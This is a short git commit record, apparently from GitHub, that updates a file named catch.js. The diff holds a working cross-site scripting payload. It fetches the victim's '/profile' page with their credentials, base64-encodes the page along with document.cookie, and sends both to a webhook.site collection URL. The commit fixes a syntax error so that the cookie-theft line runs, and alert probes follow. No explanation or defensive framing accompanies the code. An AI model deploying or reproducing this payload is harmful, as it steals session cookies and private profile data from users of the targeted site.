cb91f6fedb0c3947236a15fe8bf6c1655a090e01
Ainur <47248272+xtronix2000@users.noreply.github.com>
2026-02-04 20:25:09 +0300

    Update catch.js

--- catch.js
+++ catch.js
@@ -2,6 +2,6 @@ fetch('/profile?linemode=1',{credentials:'include'})
  .then(r=>r.text())
  .then(t=>fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?f='+btoa(t)))
  .then(()=>fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?c='+btoa(document.cookie)));
-fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?c='+btoa(document.cookie)));
+fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?c='+btoa(document.cookie));
 alert(123);
 alert(document.cookie);
